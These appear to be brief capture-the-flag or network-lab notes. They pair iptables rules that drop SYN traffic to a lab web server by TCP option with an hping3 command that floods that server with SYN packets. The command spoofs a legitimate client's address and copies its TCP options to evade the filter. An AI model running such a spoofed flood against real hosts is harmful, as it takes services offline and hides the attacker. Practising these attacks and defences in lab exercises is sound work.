# cctf-g3

# PREC
iptables -D FORWARD -i $router_iface -o $server_iface -s 10.1.1.2,10.1.3.2,10.1.4.2,10.1.2.2 -d 10.1.5.2 -p tcp --dport 80 --tcp-flags SYN SYN --tcp-option 4 -j DROP

# ORDA
iptables -I FORWARD -i $router_iface -o $server_iface -s 10.1.1.2,10.1.3.2,10.1.4.2,10.1.2.2 -d 10.1.5.2 -p tcp --dport 80 -m conntrack --ctstate NEW --tcp-option 4 -j DROP

# HPING3
sudo hping3 -p 80 -S --flood 10.1.5.2 -y --tcp-mss 1460 -w 64240 --tcp-timestamp -a client_legittimo
 
-p destination port
-S set SYN flag
--flood max power
-y don't fragment
--tcp-mss set mss to default (1460)
-w set window size to default 64240
--tcp-timestamp enable the timestamp option
-a for spoofing the legitimate client